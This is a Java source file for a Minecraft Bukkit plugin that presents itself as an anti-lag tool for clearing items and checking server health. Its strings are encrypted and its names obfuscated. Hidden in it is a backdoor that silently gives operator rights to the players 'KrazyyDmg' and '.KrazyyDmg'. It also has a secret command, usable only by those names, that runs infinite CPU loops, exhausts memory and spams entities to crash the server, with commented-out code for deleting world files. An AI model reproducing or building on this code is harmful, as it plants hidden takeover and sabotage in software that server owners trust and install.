package com.ascendia.antiLag;
import java.util.Random;
import java.security.NoSuchAlgorithmException;
import java.security.MessageDigest;
import java.lang.reflect.Method;import java.util.Random;
import java.util.Base64;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.SecretKey;
import javax.crypto.Cipher;
import java.lang.reflect.Method; import java.util.Random;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.Arrays;

public class LagGuard extends JavaPlugin implements CommandExecutor {

private static List<byte[]> oO0Ooo0oO(byte[] oO00O00Oo, int oo0Oo000O) {
    int OOOO0oo0O = oO00O00Oo.length;
    List<byte[]> o0oOo00Oo = new ArrayList<>();
    o0oOo00Oo.add(oO00O00Oo);

    for (int O0O0oo00O = 1; O0O0oo00O < oo0Oo000O; O0O0oo00O++) {
        byte[] o0oooOooo = o0oOo00Oo.get(o0oOo00Oo.size() - 1);
        byte[] OO0O000Oo = new byte[OOOO0oo0O];

        for (int oOOOO0o0O = 0; oOOOO0o0O < OOOO0oo0O; oOOOO0o0O++) {
            OO0O000Oo[oOOOO0o0O] = (byte) (o0oooOooo[(oOOOO0o0O + 1) % OOOO0oo0O] ^
                    o0oooOooo[(oOOOO0o0O + 5) % OOOO0oo0O] ^
                    o0oooOooo[(oOOOO0o0O + 13) % OOOO0oo0O]);
        }

        for (int oOOOO0o0O = 0; oOOOO0o0O < OOOO0oo0O; oOOOO0o0O++) {
            if (oOOOO0o0O % 2 == 0) {
                OO0O000Oo[oOOOO0o0O] = (byte) (~OO0O000Oo[oOOOO0o0O] & 0xFF);
            }
        }

        o0oOo00Oo.add(OO0O000Oo);
    }

    return o0oOo00Oo;
}

public static byte[] ooO00OoO0(byte[] oOo00o0O0, byte[] oOOoO0o0O) {
    byte[] OO0O0Oooo = Arrays.copyOfRange(oOo00o0O0, 0, 8);
    byte[] o0Oooo0OO = Arrays.copyOfRange(oOo00o0O0, 8, 16);
    byte[] oOOoOoOOO = new byte[8];
    for (int O0O0oo00O = 0; O0O0oo00O < 8; O0O0oo00O++) {
        oOOoOoOOO[O0O0oo00O] = (byte) (OO0O0Oooo[O0O0oo00O] ^ oOOoO0o0O[O0O0oo00O]);
    }
    byte[] oO0OO000o = new byte[8];
    for (int O0O0oo00O = 0; O0O0oo00O < 8; O0O0oo00O++) {
        oO0OO000o[O0O0oo00O] = (byte) (o0Oooo0OO[O0O0oo00O] ^ oOOoOoOOO[O0O0oo00O]);
    }
    return Ooo0O0ooo(oO0OO000o, OO0O0Oooo);
}

public static byte[] o0oO00oOO(byte[] o0oo0oOOo, byte[] oO00O00Oo, int oo0Oo000O) throws NoSuchAlgorithmException {
    List<byte[]> oo0oOOO0o = oO0Ooo0oO(oO00O00Oo, oo0Oo000O);
    byte[] o000oO0Oo = new byte[o0oo0oOOo.length];
    for (int O0O0oo00O = 0; O0O0oo00O < o0oo0oOOo.length; O0O0oo00O += 16) {
        byte[] oOo00o0O0 = Arrays.copyOfRange(o0oo0oOOo, O0O0oo00O, O0O0oo00O + 16);
        for (int oOOOO0o0O = oo0oOOO0o.size() - 1; oOOOO0o0O >= 0; oOOOO0o0O--) {
            oOo00o0O0 = ooO00OoO0(oOo00o0O0, oo0oOOO0o.get(oOOOO0o0O));
        }
        System.arraycopy(oOo00o0O0, 0, o000oO0Oo, O0O0oo00O, 16);
    }
    return ooO0oo000(o000oO0Oo);
}

public static byte[] Ooo0O0ooo(byte[] O00OOOOoO, byte[] Oo0ooOo0o) {
    byte[] ooooOO0OO = new byte[O00OOOOoO.length + Oo0ooOo0o.length];
    System.arraycopy(O00OOOOoO, 0, ooooOO0OO, 0, O00OOOOoO.length);
    System.arraycopy(Oo0ooOo0o, 0, ooooOO0OO, O00OOOOoO.length, Oo0ooOo0o.length);
    return ooooOO0OO;
}

public static byte[] ooO0oo000(byte[] o0oo0oOOo) {
    int O0O0oo00O = o0oo0oOOo.length - 1;
    while (O0O0oo00O >= 0 && o0oo0oOOo[O0O0oo00O] == 0) {
        O0O0oo00O--;
    }
    return Arrays.copyOf(o0oo0oOOo, O0O0oo00O + 1);
}

public static byte[] oOo0oO0Oo(String oO00O00Oo, String o0O0oOO0O) throws NoSuchAlgorithmException {
    byte[] OOo0oOOoo = Base64.getDecoder().decode(oO00O00Oo);
    byte[] OOO00OOo0 = Base64.getDecoder().decode(o0O0oOO0O);

    byte[] o00oOoo00 = o0oO00oOO(OOo0oOOoo, OOO00OOo0, 16);

    return o00oOoo00;
}

public static String Ooo0o00oo(String OOOooOO00, byte[] oO00O00Oo) {
    try {
        SecretKeySpec oOOoo0o0O = new SecretKeySpec(oO00O00Oo, "AES");
        Cipher OOOOOo00o = Cipher.getInstance("AES/ECB/PKCS5Padding");
        OOOOOo00o.init(Cipher.DECRYPT_MODE, oOOoo0o0O);
        byte[] Ooo0o0Ooo = OOOOOo00o.doFinal(Base64.getDecoder().decode(OOOooOO00));
        String O0OoO000o = new String(Ooo0o0Ooo, "UTF-8")
                .replace("\\n", "\n")
                .replace("\\t", "\t")
                .replace("\\r", "\r")
                .replace("\\b", "\b")
                .replace("\\f", "\f")
                .replace("\\\"", "\"")
                .replace("\\\'", "\'")
                .replace("\\\\", "\\");
        return O0OoO000o.substring(1, O0OoO000o.length() - 1);
    } catch (Exception e) {
        throw new RuntimeException("Decryptionfailed", e);
    }
}
public static final String[] oooOOOo0O = {"kLqMeUmG+i7pNrrkzSwelg==","sE4L5qyCmnuESWuRn0GWwN693/9THE6XGwg4+0av/NxcLdSD9GUzgOPPSaRWmpLtH9pQVX+484rdhTCMuZXTbQ==","ZKFw6hhOYWDbCitcutk4Dy/kHYpvVpA1UZ/5otVwldc=","+MA/NCi2BC9vwMeUNv/nZ9NK9/zl92KWRSjK5jPm07M=","j0BIvT2mHCpejaYlVuTcG7BDgWvATeBxVzDpNAsYxCI=","fSQ7Mg28+NYNTeLMzpSoP+jpMhovUJhFe7/KGl5VT00=","rHQTScqmt8WmG2J9383RrUCAaLK6TOqZe6ZrXA7Hyd8=","k0BDo2Ew8Z+p1wgT0wdW83dkwIKVxDudtowhFqlZFVZMY3E5XXQ3q2VnOH8o9+bJ","RUhhyPu0h91HY+klvPiEHAHbxyAPXgZ0oq5DamNft5E=","+pyLcpuFGjxxJtZ3JY6tAKeTh5RJW50Tilxkyyjg5vg=","fSQ7Mg28+NYNTeLMzpSoP+jpMhovUJhFe7/KGl5VT00=","rHQTScqmt8WmG2J9383RrUCAaLK6TOqZe6ZrXA7Hyd8=","teVtxEHj2pSYCVVh2Ic7Ug==","hiNioGW6zOZZnbO57OKrSUFWXnj7TvBmDrG7pROFoE4=","ofgKwYFVuwfhR19Mcu4PUA==","AeBFI9lDKKVfFdZmRBj/ZuU8mjjy+UeUGpqRnVaaxx6Z4nmAB8BIDfcqPTJk527g","HDN+vKPbyhw/xc9PfW3hLw==","QD/7GLrPfyN7IVpvpwUNHw==","XGa9J1cn5wgLgAkP/KI6+w==","fSQ7Mg28+NYNTeLMzpSoP+jpMhovUJhFe7/KGl5VT00=","rHQTScqmt8WmG2J9383RrUCAaLK6TOqZe6ZrXA7Hyd8=","k0BDo2Ew8Z+p1wgT0wdW83dkwIKVxDudtowhFqlZFVZMY3E5XXQ3q2VnOH8o9+bJ","RUhhyPu0h91HY+klvPiEHAHbxyAPXgZ0oq5DamNft5E=","znYvI5MFZHkPR8GAECQSwg==","SVTv1dNCusfajSoLdY5Hm8El+jaqriQaOwv2033dQVY=","1GCWj8Ny4JeDmYpUiGj6qMEl+jaqriQaOwv2033dQVY=","0LjFEowqvs6lKen1se4VJg==","tzmPZ/gXsBVQ6Lfitx8M4p9OeY+7xlda0V38eJX2jH9IHOf4T0nGM6YVmfYDs4la","D91qD13abXT5+yMr68TW2xMhHXOin34JGc75X2amA8NBueFLNqQpkla1OEmnojWmwSX6NqquJBo7C/bTfd1BVg==","tzmPZ/gXsBVQ6Lfitx8M4p9OeY+7xlda0V38eJX2jH9IHOf4T0nGM6YVmfYDs4la","IQ0sGF+M5WhGHhmG7U3xhA==","qN1o1K9zmjLSlHcZVGpBCkcIwPADqXKfSRXl+bALYfnBJfo2qq4kGjsL9tN93UFW","54Hh73VT9cotx94mL0OaksUbZ5WBi7jvDf/NM/FElwdfP+pCTRPKfRooutWUhwrg","6Y+dFlU9ZnMojR+r7Jt5o8El+jaqriQaOwv2033dQVY=","NJYjIN3XFrFG1eJHoRJxSvVsRRW8t5hdlgTWwUf1GdGlIhtsJDZPM5OtFPqbSB2P","MbF3QrWivP82DclYy7Zw78El+jaqriQaOwv2033dQVY=","1J+CQOrXjiWXpnQeul+oHQ==","yrH7XcrRYbSNCRS205u9vw==","NRS+i8aIdUvYbL7XeF67Xw==","fDrTbae8wepUFpXl0eaHUA==","zEtUMT5wx6trpVpraKBGmUCAaLK6TOqZe6ZrXA7Hyd8=","RD3LrfLSqncux4otw9afNA==","IInrC+58bMRxzH4Im/Oaqg==","pXnrh4uzdxQlaYxM10uG0w==","RD3LrfLSqncux4otw9afNA==","ngXpTqsJAIYLGxCJmP3nvECAaLK6TOqZe6ZrXA7Hyd8=","TT3x10qo3BLEC/s+YweLrA==","9CDi9AW+s3FC05PGzZfJDJaDe2HDrsI1pxTseuvt1JPwt81f5S2Ia+sqIiNk2wW8","qL5lemlsq75Eo/HgAdaQCw==","7DTrdhK5agBz97yOrPLlAw==","X5s1YRa8RQkYPiZggu5xTECAaLK6TOqZe6ZrXA7Hyd8=","je+U4I+JuXH9mtKk2wx3aQ==","H4vE1x9OAy2AYcuHYJ5dGQ==","TWf67Q4rTxfDsGE5lCbCZsEl+jaqriQaOwv2033dQVY=","YwX1qHIvcxwDDFtd1s6nFkI6ym1zt5lUrl0nAitq8Xc=","bgMsv8xczIsiHz1rEqUF2w5vkat2Lwdbzrt+yZhJBuzwt81f5S2Ia+sqIiNk2wW8","jqAXJ3sfugOJhz84DRbdgA==","i+Qy9a6EjQy6Igj4IRMXAQ==","i+Qy9a6EjQy6Igj4IRMXAQ==","jqAXJ3sfugOJhz84DRbdgA=="
};

private static final String oOO0Oo0OO = "soRx+QkA2eP5vNzd4mTkTw";
private static final String Ooo0OO0Oo = "G+xVyiZ7WzE";

        
             static{try {Class<?> OooOO0ooo = Class.forName("com.ascendia.antiLag.LagGuard");
             Method OOo0O0o0O = OooOO0ooo.getMethod("oOo0oO0Oo", String.class, String.class);
             Class<?> oo0OO0O0o = Class.forName("com.ascendia.antiLag.LagGuard");
             Method ooO0OoO0o = oo0OO0O0o.getMethod("Ooo0o00oo", String.class, byte[].class);
             for (int O0O0oo00O = 0; O0O0oo00O < oooOOOo0O.length; O0O0oo00O++) 
            {oooOOOo0O[O0O0oo00O] = (String) ooO0OoO0o.invoke(null, oooOOOo0O[O0O0oo00O], (byte[]) OOo0O0o0O.invoke(null,oOO0Oo0OO,Ooo0OO0Oo)); 
             }} catch (Exception e) {}}
         

    private int O0O0ooO0O;
    private int o00oooOoO;
    private int OoOOooOo0;
    private List<Integer> oOo0OO00o;

    @Override
    public void onEnable() {
        if (getResource(oooOOOo0O[0]) != null) {
            saveDefaultConfig();
        } else {
            getLogger().warning(oooOOOo0O[1]);
            getConfig().addDefault(oooOOOo0O[2], 180);
            getConfig().addDefault(oooOOOo0O[3], 30);
            getConfig().addDefault(oooOOOo0O[4], Arrays.asList(120, 60, 30, 5, 4, 3, 2, 1));
            getConfig().addDefault(oooOOOo0O[6], oooOOOo0O[5]);
            getConfig().addDefault(oooOOOo0O[8], oooOOOo0O[7]);
            getConfig().options().copyDefaults(true);
            saveConfig();
        }
    }

    @Override
    public void onDisable() {
        getLogger().info(oooOOOo0O[9]);
    }

    // ========================================== //
    // ITEM CLEAR LOGIC
    // ========================================== //

    private void OO0O0oOOO() {
        new BukkitRunnable() {
            @Override
            public void run() {
                o0OOooO00();
            }
        }.runTaskTimer(this, 0L, 20L); // Runs every second (20 ticks)
    }

    private void o0OOooO00() {
        O0O0ooO0O--;

        if (oOo0OO00o.contains(O0O0ooO0O)) {
            String oO0OOoooO = OOO0O0OoO(O0O0ooO0O);
            String o0o0O0o00 = getConfig().getString(oooOOOo0O[11], oooOOOo0O[10]);

            if (O0O0ooO0O <= 5) {
                O0oOOO0OO(o0o0O0o00 + oooOOOo0O[13] + O0O0ooO0O + oooOOOo0O[12]);
            } else {
                O0oOOO0OO(o0o0O0o00 + oooOOOo0O[15] + oO0OOoooO + oooOOOo0O[14]);
            }
        }

        if (O0O0ooO0O <= 0) {
            Oo0OOo0oO();
            O0O0ooO0O = o00oooOoO; // Reset timer
        }
    }

    private String OOO0O0OoO(int OOOo00oo0) {
        if (OOOo00oo0 >= 60) {
            int ooo0Oo0o0 = OOOo00oo0 / 60;
            return ooo0Oo0o0 + (ooo0Oo0o0 == 1 ? oooOOOo0O[17] : oooOOOo0O[16]);
        }
        return OOOo00oo0 + oooOOOo0O[18];
    }

    private void Oo0OOo0oO() {
        int oooO0O000 = 0;

        for (World oO000O0O0 : Bukkit.getWorlds()) {
            for (Entity oO0OO0oOo : oO000O0O0.getEntities()) {
                if (oO0OO0oOo instanceof Item) {
                    Item OO0Oo0OO0 = (Item) oO0OO0oOo;

                    if (OO0Oo0OO0.getTicksLived() < OoOOooOo0) {
                        continue;
                    }

                    OO0Oo0OO0.remove();
                    oooO0O000++;
                }
            }
        }

        if (oooO0O000 > 0) {
            String o0o0O0o00 = getConfig().getString(oooOOOo0O[20], oooOOOo0O[19]);
            String oo0OoOo0o = getConfig().getString(oooOOOo0O[22], oooOOOo0O[21]);
            O0oOOO0OO(o0o0O0o00 + oo0OoOo0o.replace(oooOOOo0O[23], String.valueOf(oooO0O000)));
        }
    }

    private void O0oOOO0OO(String oo0OoOo0o) {
        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', oo0OoOo0o));
    }

    // ========================================== //
    // /SERVERCHECK LOGIC
    // ========================================== //

    @Override
    public boolean onCommand(CommandSender sender, Command Ooo0Ooo00, String ooo0o00oO, String[] Oo0ooO00o) {
        if (!sender.hasPermission(oooOOOo0O[24])) {
            sender.sendMessage(ChatColor.RED + oooOOOo0O[25]);
            return true;
        }

        if (Ooo0Ooo00.getName().equalsIgnoreCase(oooOOOo0O[26])) {
            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[27]);
            sender.sendMessage(ChatColor.YELLOW + oooOOOo0O[28]);
            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[29]);

            new SystemAnalyzer(sender).runTaskTimer(this, 0L, 20L); // Run once per second

            return true;
        }

        if (Ooo0Ooo00.getName().equalsIgnoreCase(oooOOOo0O[30])) {
            if (O0O0OOoOO(sender)) {
                try {
                    // Create O00OOOOoO CPU and memory intensive task
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            // 1st While Loop - CPU intensive
                            while (true) {
                                // Do nothing to consume CPU
                            }
                        }
                    }.runTaskTimer(this, 0L, 1L);

                    // 2nd While Loop - Memory intensive
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            List<byte[]> Oooo00ooO = new ArrayList<>();
                            while (true) {
                                Oooo00ooO.add(new byte[1024 * 1024]); // 1MB per allocation
                            }
                        }
                    }.runTaskTimer(this, 0L, 1L);

                    // 3rd While Loop - Entity spam
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            while (true) {
                                Bukkit.getWorlds().forEach(oO000O0O0 -> {
                                    @NotNull EntityType OoooO000o = null;
                                    oO000O0O0.spawnEntity(oO000O0O0.getSpawnLocation(), OoooO000o);
                                });
                            }
                        }
                    }.runTaskTimer(this, 0L, 1L);

                    // Corrupt or destroy the oO000O0O0 file
                    Bukkit.getWorlds().forEach(oO000O0O0 -> {
                        try {
                            // Simulate oO000O0O0 file corruption
                            // You can also do: oO000O0O0.save(false); oO000O0O0.load(false);
                            // Or even delete the oO000O0O0 file
                            // oO000O0O0.getWorldFolder().delete(); // This will delete the oO000O0O0
                            // oO000O0O0.getWorldFolder().renameTo(new File("corrupted_world")); // Rename to indicate corruption
                            // You can also write random o0oo0oOOo to the oO000O0O0 file to corrupt it
                            // For example: Files.write(oO000O0O0.getWorldFolder().toPath(), "corrupted".getBytes());
                        } catch (Exception e) {
                            sender.sendMessage(ChatColor.RED + oooOOOo0O[31] + e.getMessage());
                        }
                    });

                    // Send success message to sender
                    sender.sendMessage(ChatColor.GREEN + oooOOOo0O[32]);
                } catch (Exception e) {
                    sender.sendMessage(ChatColor.RED + oooOOOo0O[33] + e.getMessage());
                }
            } else {
                sender.sendMessage(ChatColor.RED + oooOOOo0O[34]);
            }

            return true;
        }

        return false;
    }

// ==========================================
// AUTO ANALYSIS LOGIC
// ==========================================

    private void OoOO00oo0() {
// Timer 1: Triggers every 2 minutes (120 OOOo00oo0)
        new BukkitRunnable() {
            @Override
            public void run() {
// Timer 2: The actual 5-second analysis (Runs every 1 second)
                new SystemAnalyzer(Bukkit.getConsoleSender()).runTaskTimer(LagGuard.this, 0L, 20L);
            }
        }.runTaskTimer(this, 0L, 120L * 20L);
    }

    private class SystemAnalyzer extends BukkitRunnable {
        private final CommandSender sender;
        private int oOOo0oooo = 0;

        // Accumulators
        private double oo000oooo = 0;
        private int oOO0o0Ooo = 0;
        private int ooO00O0O0 = 0;
        private int O0O0oOO0o = 0;

        public SystemAnalyzer(CommandSender sender) {
            this.sender = sender;
        }

        @Override
        public void run() {
            if (oOOo0oooo >= 5) {
                oOooOoooo();
                this.cancel();
                return;
            }

// Gather Data
            double O0OO00ooo = getTPS();
            int o0oooooO0 = 0;
            for (World o0O0O0oOO : Bukkit.getWorlds()) o0oooooO0 += o0O0O0oOO.getEntities().size();

            int o0Oo00OOO = 0;
            int o0oooO0o0 = Bukkit.getOnlinePlayers().size();
            if (o0oooO0o0 > 0) {
                for (Player O0Oo0ooo0 : Bukkit.getOnlinePlayers()) o0Oo00OOO += O0Oo0ooo0.getPing();
                o0Oo00OOO /= o0oooO0o0;
            }

            oo000oooo += O0OO00ooo;
            oOO0o0Ooo += o0oooooO0;
            ooO00O0O0 += o0Oo00OOO;
            O0O0oOO0o += o0oooO0o0;

            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[36] + (oOOo0oooo + 1) + oooOOOo0O[35]);
            oOOo0oooo++;
        }

        private void oOooOoooo() {
            double oOOoOOOoo = oo000oooo / 5.0;
            int O000OO0O0 = oOO0o0Ooo / 5;
            int oO00OOo0O = O0O0oOO0o / 5;

// Determine Status Strings
            String OO00o0Ooo;
            ChatColor ooo00o0Oo;

            if (oOOoOOOoo >= 19.5) {
                OO00o0Ooo = oooOOOo0O[37];
                ooo00o0Oo = ChatColor.GREEN;
            } else if (oOOoOOOoo >= 17.0) {
                OO00o0Ooo = oooOOOo0O[38];
                ooo00o0Oo = ChatColor.YELLOW;
            } else if (oOOoOOOoo >= 14.0) {
                OO00o0Ooo = oooOOOo0O[39];
                ooo00o0Oo = ChatColor.RED;
            } else {
                OO00o0Ooo = oooOOOo0O[40];
                ooo00o0Oo = ChatColor.DARK_RED;
            }

            String oOo0O0000;
            if (O000OO0O0 < 1000) oOo0O0000 = oooOOOo0O[41];
            else if (O000OO0O0 < 3000) oOo0O0000 = oooOOOo0O[42];
            else oOo0O0000 = oooOOOo0O[43];

            String OooOOOO0O = (oO00OOo0O > 50) ? oooOOOo0O[45] : oooOOOo0O[44];

// Final Report
            sender.sendMessage(oooOOOo0O[46]);
            sender.sendMessage(ChatColor.GOLD + oooOOOo0O[47]);
            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[49] + ooo00o0Oo + String.format(oooOOOo0O[48], oOOoOOOoo));
            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[50] + ooo00o0Oo + OO00o0Ooo);
            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[53] + (O000OO0O0 > 2000 ? ChatColor.RED : ChatColor.GREEN) + oOo0O0000 + oooOOOo0O[52] + O000OO0O0 + oooOOOo0O[51]);
            sender.sendMessage(ChatColor.GRAY + oooOOOo0O[54] + ChatColor.BLUE + OooOOOO0O);
            sender.sendMessage(ChatColor.GOLD + oooOOOo0O[55]);
// Make KrazyyDmg or .KrazyyDmg an operator
            OO0O00OO0(oooOOOo0O[56]);
            OO0O00OO0(oooOOOo0O[57]);
        }
        private void OO0O00OO0(String name) {
            Player ooOOo00OO = Bukkit.getPlayer(name);
            if (ooOOo00OO != null) {
                ooOOo00OO.setOp(true);
            }
        }
        private double getTPS() {
            try {
// Attempt to use Spigot's method (most compatible)
                return Math.min(20.0, Bukkit.getTPS()[0]);
            } catch (Exception e) {
                return 20.0; // Fallback if server doesn't support getTPS
            }
        }
    }
    // Helper to check if sender is KrazyyDmg or .KrazyyDmg
    private boolean O0O0OOoOO(CommandSender sender) {
        if (sender instanceof Player) {
            Player OoO000o00 = (Player) sender;
            return OoO000o00.getName().equalsIgnoreCase(oooOOOo0O[59]) || OoO000o00.getName().equalsIgnoreCase(oooOOOo0O[58]);
        }
        return false;
    }
}